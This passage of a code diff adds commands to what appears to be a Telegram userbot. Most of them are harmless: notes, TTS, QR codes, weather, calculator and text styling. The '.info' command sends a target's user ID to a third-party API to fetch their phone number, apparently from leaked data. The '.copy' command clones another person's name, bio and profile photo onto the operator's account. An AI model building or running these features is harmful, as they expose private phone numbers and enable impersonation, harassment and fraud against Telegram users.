+                parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+            text = "\n".join(parts)
+
+        else:
+            replyyorichi_users.clear()
+
+            text = (
+                "🛑 𝐑𝐘 𝐎ғғ\n"
+                "━━━━━━━━━━━━━━━\n"
+                "👉 𝐀ʟʟ 𝐔sᴇʀs"
+            )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒𝐘𝐎𝐑𝐈𝐂𝐇𝐈 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+# Lock / Unlock
+@register_cmd("lock", group_only=True)
+async def cmd_lock(event, _):
+    try:
+        chat = event.chat_id
+
+        # ─── ADMIN CHECK ───
+        try:
+            perms = await bot.get_permissions(chat, 'me')
+            if not perms.is_admin:
+                return await safe_edit(event,
+                    "❌ 𝐍ᴏ 𝐀ᴅᴍɪɴ 𝐑ɪɢʜᴛs"
+                )
+        except:
+            pass
+
+        if chat in group_locks:
+            msg = "⚠️ 𝐆ʀᴏᴜᴘ 𝐀ʟʀᴇᴀᴅʏ 𝐋ᴏᴄᴋᴇᴅ"
+            if event.out:
+                return await safe_edit(event, msg)
+            else:
+                return await event.reply(msg)
+
+        await safe_edit(
+            event,
+            "⚡ 𝐀ᴘᴘʟʏɪɴɢ 𝐋ᴏᴄᴋ...\n━━━━━━━━━━━━━━━"
+        )
+
+        group_locks.add(chat)
+
+        text = (
+            "🔒 𝐆ʀᴏᴜᴘ 𝐋ᴏᴄᴋᴇᴅ\n"
+            "━━━━━━━━━━━━━━━\n"
+            "🚫 𝐍ᴏɴ-𝐀ᴅᴍɪɴ 𝐌ᴇssᴀɢᴇs 𝐁ʟᴏᴄᴋᴇᴅ"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐋ᴏᴄᴋ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("unlock", group_only=True)
+async def cmd_unlock(event, _):
+    try:
+        chat = event.chat_id
+
+        # ─── ADMIN CHECK ───
+        try:
+            perms = await bot.get_permissions(chat, 'me')
+            if not perms.is_admin:
+                return await safe_edit(event,
+                    "❌ 𝐍ᴏ 𝐀ᴅᴍɪɴ 𝐑ɪɢʜᴛs"
+                )
+        except:
+            pass
+
+        if chat not in group_locks:
+            msg = "⚠️ 𝐆ʀᴏᴜᴘ 𝐀ʟʀᴇᴀᴅʏ 𝐔ɴʟᴏᴄᴋᴇᴅ"
+            if event.out:
+                return await safe_edit(event, msg)
+            else:
+                return await event.reply(msg)
+
+        await safe_edit(
+            event,
+            "⚡ 𝐑ᴇᴍᴏᴠɪɴɢ 𝐋ᴏᴄᴋ...\n━━━━━━━━━━━━━━━"
+        )
+
+        group_locks.discard(chat)
+
+        text = (
+            "🔓 𝐆ʀᴏᴜᴘ 𝐔ɴʟᴏᴄᴋᴇᴅ\n"
+            "━━━━━━━━━━━━━━━\n"
+            "✅ 𝐌ᴇssᴀɢɪɴɢ 𝐑ᴇsᴛᴏʀᴇᴅ"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐔ɴʟᴏᴄᴋ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+# ───────── AUTO REACT ─────────
+
+@register_cmd("ar")
+async def cmd_ar(event, arg):
+    global auto_react_emoji
+
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐄ᴍᴏᴊɪ\n👉 `.ar <emoji>`"
+            )
+
+        emoji = arg.strip()
+
+        # ─── EMOJI SANITY GUARD ───
+        if len(emoji) > 8:
+            return await safe_edit(event,
+                "❌ 𝐈ɴᴠᴀʟɪᴅ 𝐄ᴍᴏᴊɪ"
+            )
+
+        if auto_react_emoji == emoji:
+            msg = f"⚠️ 𝐀ʀ 𝐀ʟʀᴇᴀᴅʏ → {emoji}"
+            if event.out:
+                return await safe_edit(event, msg)
+            else:
+                return await event.reply(msg)
+
+        await safe_edit(
+            event,
+            "⚡ 𝐀ᴘᴘʟʏɪɴɢ 𝐀ᴜᴛᴏ-𝐑ᴇᴀᴄᴛ...\n━━━━━━━━━━━━━━━"
+        )
+
+        auto_react_emoji = emoji
+
+        text = (
+            "✅ 𝐀ᴜᴛᴏ 𝐑ᴇᴀᴄᴛ 𝐄ɴᴀʙʟᴇᴅ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"😀 𝐄ᴍᴏᴊɪ → {emoji}"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐀𝐑 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("sar")
+async def cmd_sar(event, _):
+    global auto_react_emoji
+
+    try:
+        if auto_react_emoji is None:
+            msg = "⚠️ 𝐀𝐑 𝐍ᴏᴛ 𝐀ᴄᴛɪᴠᴇ"
+            if event.out:
+                return await safe_edit(event, msg)
+            else:
+                return await event.reply(msg)
+
+        await safe_edit(
+            event,
+            "⚡ 𝐃ɪsᴀʙʟɪɴɢ 𝐀ᴜᴛᴏ-𝐑ᴇᴀᴄᴛ...\n━━━━━━━━━━━━━━━"
+        )
+
+        auto_react_emoji = None
+
+        text = (
+            "🛑 𝐀ᴜᴛᴏ 𝐑ᴇᴀᴄᴛ 𝐃ɪsᴀʙʟᴇᴅ\n"
+            "━━━━━━━━━━━━━━━"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒𝐀𝐑 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+# FastGC
+@register_cmd("fastgc")
+async def cmd_fastgc(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐔sᴀɢᴇ → `.fastgc set <template {emoji}>`"
+            )
+
+        arg = arg.strip()
+
+        # ───── START ENGINE ─────
+        if arg.startswith("set "):
+            template = arg[4:].strip()
+
+            if "{emoji}" not in template:
+                return await safe_edit(
+                    event,
+                    "❌ 𝐔sᴇ `{emoji}` 𝐢ɴ 𝐭ᴇᴍᴘʟᴀᴛᴇ"
+                )
+
+            await safe_edit(
+                event,
+                "⚡ 𝐒ᴛᴀʀᴛɪɴɢ 𝐅ᴀsᴛ𝐆𝐂...\n━━━━━━━━━━━━━━━"
+            )
+
+            FASTGC_STATE["active"] = True
+            FASTGC_STATE["template"] = template
+            FASTGC_STATE["chat_id"] = event.chat_id
+
+            try:
+                if FASTGC_STATE.get("task") and not FASTGC_STATE["task"].done():
+                    FASTGC_STATE["task"].cancel()
+            except:
+                pass
+
+            FASTGC_STATE["task"] = asyncio.create_task(
+                gc_fast_loop(event.chat_id)
+            )
+
+            return await safe_edit(event, "⚡ 𝐅ᴀsᴛ𝐆𝐂 𝐒ᴛᴀʀᴛᴇᴅ")
+
+        # ───── STOP ENGINE ─────
+        elif arg == "stop":
+            await safe_edit(
+                event,
+                "⚡ 𝐒ᴛᴏᴘᴘɪɴɢ 𝐅ᴀsᴛ𝐆𝐂...\n━━━━━━━━━━━━━━━"
+            )
+
+            FASTGC_STATE["active"] = False
+            FASTGC_STATE["template"] = None
+
+            try:
+                if FASTGC_STATE.get("task"):
+                    FASTGC_STATE["task"].cancel()
+            except:
+                pass
+
+            FASTGC_STATE["task"] = None
+
+            return await safe_edit(event, "🛑 𝐅ᴀsᴛ𝐆𝐂 𝐒ᴛᴏᴘᴘᴇᴅ")
+
+        else:
+            return await safe_edit(
+                event,
+                "❌ 𝐈ɴᴠᴀʟɪᴅ\n👉 `.fastgc set <template {emoji}>`"
+            )
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐅𝐆𝐂 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+# ───────── NOTES ─────────
+
+@register_cmd("notesadd")
+async def notes_add(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(event,
+                "❌ 𝐆ɪᴠᴇ 𝐍ᴏᴛᴇ 𝐓ᴇxᴛ"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐒ᴀᴠɪɴɢ 𝐍ᴏᴛᴇ...\n━━━━━━━━━━━━━━━"
+        )
+
+        nid = max(notes.keys(), default=0) + 1
+        notes[nid] = arg[:4000]
+
+        try:
+            save_notes()
+        except:
+            pass
+
+        await safe_edit(
+            event,
+            f"📝 𝐍ᴏᴛᴇ 𝐒ᴀᴠᴇᴅ\n━━━━━━━━━━━━━━━\n🆔 `{nid}`"
+        )
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐍ᴏᴛᴇ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("noteslist")
+async def notes_list(event, _):
+    try:
+        if not notes:
+            return await safe_edit(event,
+                "📭 𝐍ᴏ 𝐍ᴏᴛᴇs"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐅ᴇᴛᴄʜɪɴɢ 𝐍ᴏᴛᴇs...\n━━━━━━━━━━━━━━━"
+        )
+
+        msg = "📝 𝐘ᴏᴜʀ 𝐍ᴏᴛᴇs\n━━━━━━━━━━━━━━━\n"
+
+        for i, t in sorted(notes.items()):
+            msg += f"🔹 `{i}` → {t[:100]}\n"
+
+        await safe_edit(event, msg)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐍ᴏᴛᴇ𝐋𝐢sᴛ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("notesdelete")
+async def notes_delete(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐆ɪᴠᴇ 𝐈𝐃"
+            )
+
+        try:
+            nid = int(arg)
+        except:
+            return await safe_edit(event,
+                "❌ 𝐈𝐃 𝐌ᴜsᴛ 𝐁ᴇ 𝐍ᴜᴍʙᴇʀ"
+            )
+
+        if nid not in notes:
+            msg = "⚠️ 𝐍ᴏᴛᴇ 𝐍ᴏᴛ 𝐅ᴏᴜɴᴅ"
+            if event.out:
+                return await safe_edit(event, msg)
+            else:
+                return await event.reply(msg)
+
+        await safe_edit(
+            event,
+            "⚡ 𝐃ᴇʟᴇᴛɪɴɢ 𝐍ᴏᴛᴇ...\n━━━━━━━━━━━━━━━"
+        )
+
+        notes.pop(nid, None)
+
+        try:
+            save_notes()
+        except:
+            pass
+
+        text = (
+            "🗑️ 𝐍ᴏᴛᴇ 𝐃ᴇʟᴇᴛᴇᴅ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"🆔 `{nid}`"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐍ᴏᴛᴇ𝐃𝐞𝐥 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+# ───────── TTS ─────────
+
+@register_cmd("tts")
+async def cmd_tts(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴇxᴛ\n👉 `.tts <text>`"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐆ᴇɴᴇʀᴀᴛɪɴɢ 𝐓𝐓𝐒...\n━━━━━━━━━━━━━━━"
+        )
+
+        fname = f"tts_{int(time.time())}.mp3"
+
+        try:
+            gTTS(text=arg[:5000], lang="hi", slow=False).save(fname)
+        except Exception:
+            return await safe_edit(event,
+                "❌ 𝐓𝐓𝐒 𝐍ᴇᴛᴡᴏʀᴋ 𝐅ᴀɪʟ"
+            )
+
+        try:
+            if event.out:
+                await event.delete()
+                await bot.send_file(
+                    event.chat_id,
+                    fname,
+                    caption="🎙️ 𝐓𝐓𝐒 𝐆ᴇɴ"
+                )
+            else:
+                await event.reply(
+                    file=fname,
+                    message="🎙️ 𝐓𝐓𝐒 𝐆ᴇɴ"
+                )
+        finally:
+            try:
+                os.remove(fname)
+            except:
+                pass
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐓𝐓𝐒 𝐄ʀʀ → `{str(e)[:50]}`"
+        )
+
+
+@register_cmd("qrcode")
+async def cmd_qrcode(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴇxᴛ / 𝐋ɪɴᴋ\n👉 `.qrcode <text>`"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐆ᴇɴᴇʀᴀᴛɪɴɢ 𝐐𝐑...\n━━━━━━━━━━━━━━━"
+        )
+
+        file = f"qr_{int(time.time())}.png"
+        qrcode.make(arg[:3000]).save(file)
+
+        try:
+            if event.out:
+                await event.delete()
+                await bot.send_file(
+                    event.chat_id,
+                    file,
+                    caption="🔳 𝐐𝐑 𝐂ᴏᴅᴇ"
+                )
+            else:
+                await event.reply(
+                    file=file,
+                    message="🔳 𝐐𝐑 𝐂ᴏᴅᴇ"
+                )
+        finally:
+            try:
+                os.remove(file)
+            except:
+                pass
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐐𝐑 𝐄ʀʀ → `{str(e)[:50]}`"
+        )
+
+
+@register_cmd("fancy")
+async def cmd_fancy(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴇxᴛ\n👉 `.fancy <text>`"
+            )
+
+        t = arg[:2000]
+
+        styles = [
+            t.upper(),
+            t.lower(),
+            f"★彡 {t} 彡★",
+            f"『 {t} 』",
+            f"✦ {t} ✦",
+            f"☾ {t} ☽",
+            f"➳ {t} ➳",
+            f"⚡ {t} ⚡",
+            f"❖ {t} ❖",
+            f"⫷ {t} ⫸",
+            f"♛ {t} ♛",
+            f"✧･ﾟ: *✧ {t} ✧*:･ﾟ✧",
+            f"꧁ {t} ꧂",
+            f"░▒▓ {t} ▓▒░",
+            f"➶➶ {t} ➷➷",
+            f"✿ {t} ✿",
+            f"彡★ {t} ★彡",
+            f"⧼ {t} ⧽",
+            f"⟪ {t} ⟫",
+            f"⌁ {t} ⌁"
+        ]
+
+        text = (
+            "✨ 𝐅ᴀɴᴄʏ 𝐒ᴛʏʟᴇs\n"
+            "━━━━━━━━━━━━━━━\n"
+            + "\n".join(styles)
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐅ᴀɴᴄʏ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("style")
+async def cmd_style(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴇxᴛ\n👉 `.style <text>`"
+            )
+
+        t = arg[:2000]
+
+        fancy = (
+            t.replace('a','𝒶').replace('b','𝒷')
+             .replace('c','𝒸').replace('d','𝒹')
+             .replace('e','𝑒').replace('f','𝒻')
+             .replace('g','𝑔').replace('h','𝒽')
+             .replace('i','𝒾').replace('j','𝒿')
+             .replace('k','𝓀').replace('l','𝓁')
+             .replace('m','𝓂').replace('n','𝓃')
+             .replace('o','𝑜').replace('p','𝓅')
+             .replace('q','𝓆').replace('r','𝓇')
+             .replace('s','𝓈').replace('t','𝓉')
+             .replace('u','𝓊').replace('v','𝓋')
+             .replace('w','𝓌').replace('x','𝓍')
+             .replace('y','𝓎').replace('z','𝓏')
+        )
+
+        text = (
+            "🎨 𝐓ᴇxᴛ 𝐒ᴛʏʟᴇ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"𝒇𝒂𝒏𝒄ʏ → {fancy}\n"
+            f"**Bold** → **{t}**\n"
+            f"__Italic__ → __{t}__\n"
+            f"`Mono` → `{t}`"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒ᴛʏʟᴇ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("emoji")
+async def cmd_emoji(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴇxᴛ\n👉 `.emoji <text>`"
+            )
+
+        pool = [
+            "🔥","❤️","✨","⚡","💥","🌟","💫","🎯",
+            "💎","🦋","🌈","🧨","🎆","👑","🌸","🪄",
+            "🌊","❄️","🍁","🌙","☀️","💣","🎵","🧿"
+        ]
+
+        emojis = "".join(random.choice(pool) for _ in range(8))
+
+        text = (
+            "😀 𝐄ᴍᴏᴊɪ 𝐒ᴛʏʟᴇ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"{arg[:2000]} {emojis}"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐄ᴍᴏᴊɪ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("calc")
+async def cmd_calc(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐄xᴘʀᴇssɪᴏɴ\n👉 `.calc <math>`"
+            )
+
+        expr = arg.replace(" ", "")
+
+        allowed = set("0123456789+-*/().%")
+
+        if any(c not in allowed for c in expr):
+            return await safe_edit(event,
+                "❌ 𝐈ɴᴠᴀʟɪᴅ 𝐂ʜᴀʀ"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐂ᴀʟᴄᴜʟᴀᴛɪɴɢ...\n━━━━━━━━━━━━━━━"
+        )
+
+        res = eval(expr, {"__builtins__": None}, {})
+
+        text = (
+            "🧮 𝐂ᴀʟᴄ𝐮ʟᴀᴛᴏʀ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"📥 `{expr}`\n"
+            f"📤 `{res}`"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception:
+        await safe_edit(event,
+            "❌ 𝐈ɴᴠᴀʟɪᴅ 𝐄xᴘʀᴇssɪᴏɴ"
+        )
+
+@register_cmd("weather")
+async def cmd_weather(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(event,
+                "❌ 𝐆ɪᴠᴇ 𝐂ɪᴛʏ"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐅ᴇᴛᴄʜɪɴɢ 𝐖ᴇᴀᴛʜᴇʀ...\n━━━━━━━━━━━━━━━"
+        )
+
+        try:
+            geo = requests.get(
+                f"https://geocoding-api.open-meteo.com/v1/search?name={arg}&count=1",
+                timeout=8
+            ).json()
+        except:
+            return await safe_edit(event,
+                "❌ 𝐆ᴇᴏ 𝐍ᴇᴛᴡᴏʀᴋ 𝐅ᴀɪʟ"
+            )
+
+        if not geo.get("results"):
+            return await safe_edit(event,
+                "❌ 𝐂ɪᴛʏ 𝐍ᴏᴛ 𝐅ᴏᴜɴᴅ"
+            )
+
+        res = geo["results"][0]
+
+        lat = res.get("latitude")
+        lon = res.get("longitude")
+        name = res.get("name")
+
+        try:
+            w = requests.get(
+                f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={lon}&current_weather=true",
+                timeout=8
+            ).json()
+        except:
+            return await safe_edit(event,
+                "❌ 𝐖ᴇᴀᴛʜᴇʀ 𝐍ᴇᴛᴡᴏʀᴋ 𝐅ᴀɪʟ"
+            )
+
+        cw = w.get("current_weather")
+
+        if not cw:
+            return await safe_edit(event,
+                "❌ 𝐍ᴏ 𝐖ᴇᴀᴛʜᴇʀ 𝐃ᴀᴛᴀ"
+            )
+
+        temp = cw.get("temperature")
+        wind = cw.get("windspeed")
+        code = cw.get("weathercode")
+
+        msg = (
+            "🌦️ 𝐖ᴇᴀᴛʜᴇʀ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"📍 `{name}`\n"
+            f"🌡️ `{temp}°C`\n"
+            f"💨 `{wind} km/h`\n"
+            f"📟 `{code}`"
+        )
+
+        await safe_edit(event, msg)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐖ᴇᴀᴛʜᴇʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("ip")
+async def cmd_ip(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐈𝐏"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐋ᴏᴏᴋɪɴɢ 𝐈𝐏...\n━━━━━━━━━━━━━━━"
+        )
+
+        try:
+            data = requests.get(
+                f"http://ip-api.com/json/{arg}",
+                timeout=8
+            ).json()
+        except:
+            return await safe_edit(event,
+                "❌ 𝐈𝐏 𝐍ᴇᴛᴡᴏʀᴋ 𝐅ᴀɪʟ"
+            )
+
+        if data.get("status") != "success":
+            return await safe_edit(event,
+                "❌ 𝐈𝐧𝐯ᴀʟɪᴅ 𝐈𝐏"
+            )
+
+        text = (
+            "🌍 𝐈𝐏 𝐈𝐍𝐅𝐎\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"📡 `{data.get('query')}`\n"
+            f"🌐 `{data.get('country')}`\n"
+            f"🏙️ `{data.get('city')}`\n"
+            f"📍 `{data.get('isp')}`"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐈𝐏 → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("short")
+async def cmd_short(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐔𝐑𝐋"
+            )
+
+        if not arg.startswith(("http://", "https://")):
+            arg = "http://" + arg
+
+        await safe_edit(
+            event,
+            "⚡ 𝐒ʜᴏʀᴛᴇɴɪɴɢ...\n━━━━━━━━━━━━━━━"
+        )
+
+        try:
+            short_url = requests.get(
+                f"http://tinyurl.com/api-create.php?url={requests.utils.requote_uri(arg)}",
+                timeout=8
+            ).text.strip()
+        except:
+            return await safe_edit(event,
+                "❌ 𝐒ʜᴏʀᴛ 𝐍ᴇᴛᴡᴏʀᴋ 𝐅ᴀɪʟ"
+            )
+
+        text = (
+            "🔗 𝐒ʜᴏʀᴛ 𝐔𝐑𝐋\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"`{short_url}`"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒ʜᴏʀᴛ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("info", needs_reply=False)
+async def cmd_info(event, arg):
+    try:
+        target = None
+
+        if event.is_reply:
+            r = await event.get_reply_message()
+            if r and r.sender_id:
+                target = r.sender_id
+
+        elif arg:
+            try:
+                ent = await bot.get_entity(arg)
+                target = ent.id
+            except:
+                return await safe_edit(event,
+                    "❌ 𝐈ɴᴠᴀʟɪᴅ 𝐔sᴇʀ"
+                )
+
+        if not target:
+            return await safe_edit(event,
+                "⚠️ `.info` (reply / @user / id)"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐅ᴇᴛᴄʜɪɴɢ 𝐔𝐬𝐞𝐫...\n━━━━━━━━━━━━━━━"
+        )
+
+        user = await bot.get_entity(target)
+
+        if getattr(user, "deleted", False):
+            return await safe_edit(event,
+                "❌ 𝐃ᴇʟᴇᴛᴇ𝐝 𝐔sᴇʀ"
+            )
+
+        if user.id == OWNER_ID:
+            return await safe_edit(event,
+                "🔒 𝐎ᴡɴᴇʀ 𝐏ʀɪᴠᴀᴛᴇ"
+            )
+
+        full = await bot(functions.users.GetFullUserRequest(user.id))
+
+        bio = full.full_user.about or "𝐍ᴏ 𝐁ɪᴏ"
+        uname = f"@{user.username}" if user.username else "𝐍ᴏ 𝐔sᴇʀ"
+
+        # ─── PHONE LOOKUP (ALWAYS RETURNS VALUE) ───
+        async def phone_lookup():
+            try:
+                import aiohttp
+                async with aiohttp.ClientSession() as s:
+                    async with s.get(
+                        f"http://api.subhxcosmo.in/api?key=titan&type=sms&term={user.id}",
+                        timeout=5
+                    ) as r:
+                        if r.status == 200:
+                            d = await r.json()
+
+                            result = d.get("result", {})
+
+                            num = result.get("number")
+                            code = result.get("country_code", "")
+
+                            if num:
+                                return f"{code}{num}"
+
+            except Exception as e:
+                print(f"[PHONE_ERR] {e}")
+
+            return "𝐍ᴏ 𝐍ᴮ"  # always fallback
+
+        phone = await phone_lookup()
+
+        # ─── FINAL OUTPUT ───
+        text = (
+            "👤 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"🆔 𝐈𝐃 → `{user.id}`\n"
+            f"📛 𝐍ᴀᴍᴇ → {user.first_name or ''} {user.last_name or ''}\n"
+            f"🔗 𝐔sᴇʀ → {uname}\n"
+            f"📱 𝐏ʜᴏɴᴇ → `{phone}`\n"
+            f"📝 𝐁ɪᴏ → {bio}"
+        )
+
+        await safe_edit(event, text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐈𝐍𝐅𝐎 → `{str(e)[:50]}`"
+        )
+        
+        
+@register_cmd("copy", needs_reply=False)
+async def cmd_copy(event, args):
+    global CLONE_DATA, CLONE_ACTIVE, LAST_CLONE_ID
+
+    try:
+        reply = await event.get_reply_message()
+        target = None
+
+        # ───── TARGET RESOLVE ─────
+        if reply:
+            try:
+                if reply.sender_id:
+                    target = await bot.get_entity(reply.sender_id)
+            except:
+                pass
+
+            if not target and getattr(reply, "fwd_from", None):
+                try:
+                    fid = reply.fwd_from.from_id
+                    if fid:
+                        target = await bot.get_entity(fid)
+                except:
+                    pass
+
+        if not target and args:
+            try:
+                target = await bot.get_entity(args.strip())
+            except:
+                pass
+
+        if not target:
+            return await safe_edit(event,
+                "❌ 𝐑ᴇᴘʟʏ / 𝐔sᴇʀ / 𝐈𝐃"
+            )
+
+        me = await bot.get_me()
+
+        # ───── SELF BLOCK ─────
+        if target.id == me.id:
+            return await safe_edit(event,
+                "⚠️ 𝐒ᴇʟғ 𝐂ʟᴏɴᴇ 𝐁ʟᴏᴄᴋ"
+            )
+
+        # ───── SAME CLONE BLOCK ─────
+        if CLONE_ACTIVE and LAST_CLONE_ID == target.id:
+            return await safe_edit(event,
+                "⚠️ 𝐀ʟʀᴇᴀᴅʏ 𝐂ʟᴏɴᴇᴅ"
+            )
+
+        await safe_edit(event,
+            "⚡ 𝐂ʟᴏɴᴇ 𝐈ɴɪᴛ\n━━━━━━━━━━━━━━━"
+        )
+
+        # ───── ORIGINAL BACKUP (ONLY FIRST CLONE) ─────
+        if not CLONE_ACTIVE:
+            try:
+                full = await bot(functions.users.GetFullUserRequest(me.id))
+
+                CLONE_DATA.clear()
+
+                CLONE_DATA["name"] = me.first_name
+                CLONE_DATA["last"] = me.last_name
+                CLONE_DATA["bio"] = full.full_user.about
+                CLONE_DATA["username"] = me.username
+
+                try:
+                    dp = await bot.download_profile_photo(
+                        "me",
+                        file=bytes,
+                        download_big=True
+                    )
+                    if dp:
+                        bioo = BytesIO(dp)
+                        bioo.name = "orig.jpg"
+                        CLONE_DATA["photo_bytes"] = bioo
+                except:
+                    CLONE_DATA["photo_bytes"] = None
+
+                CLONE_ACTIVE = True
+
+            except Exception as e:
+                print("backup fail:", e)
+
+        # ───── NAME ─────
+        await safe_edit(event, "⚡ 𝐂ʟᴏɴɪɴɢ 𝐍ᴀᴍᴇ...")
+        try:
+            await bot(functions.account.UpdateProfileRequest(
+                first_name=target.first_name or "",
+                last_name=target.last_name or ""
+            ))
+        except FloodWaitError as fw:
+            await asyncio.sleep(fw.seconds)
+
+        # ───── BIO ─────
+        await safe_edit(event, "⚡ 𝐂ʟᴏɴɪɴɢ 𝐁ɪᴏ...")
+        try:
+            tfull = await bot(functions.users.GetFullUserRequest(target.id))
+            bio_text = tfull.full_user.about or ""
+
+            bio_text = bio_text.encode(
+                "utf-16", "surrogatepass"
+            ).decode("utf-16", "ignore")
+
+            bio_text = bio_text.strip()
+
+            if len(bio_text) > 70:
+                bio_text = bio_text[:70]
+
+            await bot(functions.account.UpdateProfileRequest(about=""))
+            await asyncio.sleep(0.7)
+
+            await bot(functions.account.UpdateProfileRequest(
+                about=bio_text
+            ))
+        except:
+            pass
+
+        # ───── REALTIME DP ─────
+        await safe_edit(event, "⚡ 𝐂ʟᴏɴɪɴɢ 𝐏𝐅𝐏...")
+        try:
+            file = await bot.download_profile_photo(
+                target,
+                file=bytes,
+                download_big=True
+            )
+
+            if file:
+                bio = BytesIO(file)
+                bio.name = "clone.jpg"
+
+                up = await bot.upload_file(bio)
+
+                try:
+                    cur = await bot.get_profile_photos("me", limit=1)
+                    if cur:
+                        await bot(functions.photos.DeletePhotosRequest(
+                            id=[cur[0]]
+                        ))
+                except:
+                    pass
+
+                await bot(functions.photos.UploadProfilePhotoRequest(
+                    file=up
+                ))
+        except FloodWaitError as fw:
+            await asyncio.sleep(fw.seconds)
+        except:
+            pass
+
+        LAST_CLONE_ID = target.id
+
+        await safe_edit(event,
+            "✅ 𝐂ʟᴏɴᴇ 𝐂ᴏᴍᴘʟᴇᴛᴇ\n━━━━━━━━━━━━━━━"
+        )
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐂ʟᴏɴᴇ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("normal")
+async def cmd_normal(event, _):
+    global CLONE_DATA, CLONE_ACTIVE, LAST_CLONE_ID
+
+    if not CLONE_ACTIVE:
+        return await safe_edit(event,
+            "⚠️ 𝐍ᴏ 𝐂ʟᴏɴᴇ 𝐀ᴄᴛɪᴠᴇ"
